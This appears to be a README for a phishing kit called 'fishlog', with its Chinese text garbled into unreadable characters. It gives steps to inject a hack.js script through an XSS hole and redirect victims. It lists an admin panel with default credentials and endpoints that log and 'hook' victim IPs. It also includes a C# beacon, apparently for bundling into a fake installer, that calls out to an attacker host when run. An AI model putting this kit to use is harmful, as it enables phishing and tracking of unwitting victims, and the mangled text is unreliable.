## ʹ�÷��� 
�ڴ���XSS��λ�ò���

```javascript
<script src="hack.js"></script>
```


js������λ��Ϊ��������ϵ�λ�� 



hack.js��Ҫ�޸�  

```
 60    window.location.href="https://www.baidu.com/";
```

60�е���ת��ַΪ���ĵ���ҳ���ַ

------

��½��ַ

```
http://127.0.0.1/fishlog/public/index.php/admins/account/login
```

��ʼ�˺�:admin       ��ʼ����: 123456        



���ݿ����� : fishlog
�˺� �� root

���� ��root



------



��������ӿ� : ͨ��һϵ�����ݣ��������ж��Ƿ��ѱ�ʶ�������

```
http://127.0.0.1/fishlog/public/index.php/admins/Index/index
```

ע:����ֻ�д�ڷ�������  ���ܻ�ȡIP  �ڱ��ض�����127.0.0.1



�Ϲ�����ӿ� : ���������IP�����ٽ��е������

```
http://127.0.0.1/fishlog/public/index.php/admins/Index/onhook
```



�����������װ�����ӣ����ߺ��������󣬻���rar�Խ�ѹ����

```c#
using System;
using System.Net;
using System.Threading;

namespace testHttp
{
    class Program
    {
        static void Main(string[] args)
        {
            ThreadStart childref = new ThreadStart(sendLog);
            Thread childThread = new Thread(childref);
            childThread.Start();
        }

        public static void sendLog()
        {
            string url = "http://hackerc.com/api.php?m=api&do=myLogk";
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
            request.Method = "HEAD";
            request.Timeout = 100000;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        }
    }
}
```

�ο�:

https://www.moonsec.com/archives/2546
https://www.t00ls.net/viewthread.php?tid=57827&extra=&highlight=flash&page=1
https://www.t00ls.net/viewthread.php?tid=58890&highlight=flash


------

�°汾....

1.�Ӻ�����
6.״̬��Ŀ��Ҫ�޸�״̬